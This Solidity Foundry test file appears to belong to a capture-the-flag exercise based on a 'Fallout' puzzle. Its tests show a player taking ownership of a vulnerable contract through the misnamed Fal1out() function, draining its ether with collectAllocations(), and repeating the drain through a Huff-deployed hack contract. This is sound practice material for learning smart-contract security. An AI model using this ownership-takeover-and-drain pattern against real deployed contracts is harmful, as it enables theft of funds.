// SPDX-License-Identifier: Unlicense
pragma solidity ^0.8.15;

import "foundry-huff/HuffDeployer.sol";
import "forge-std/Test.sol";
import "forge-std/console.sol";

import {Fallout} from "src/Challenge2-fallout/Puzzle.sol";

contract Challenge2Test is Test {
    /// @dev Address of the SimpleStore contract.
    Fallout public puzzle;
    address player = makeAddr("player");
    address realOwner;

    /// @dev Setup the testing environment.
    function setUp() public {
        puzzle = new Fallout();
        vm.deal(address(puzzle), 1 ether);
        vm.deal(player, 3);
    }

    function testSimpleHack() public {
        vm.startPrank(player);

        puzzle.Fal1out();
        puzzle.collectAllocations();

        assertEq(address(puzzle).balance, 0);
        vm.stopPrank();
    }

    function testHackHuff() public {
        address hack = HuffDeployer.deploy("Challenge2-fallout/Hack");

        IHack(hack).hack{value: 3}(address(puzzle));

        assertEq(address(puzzle).balance, 0);
    }

    receive() external payable {}
}

interface IHack {
    function hack(address _target) external payable;
}
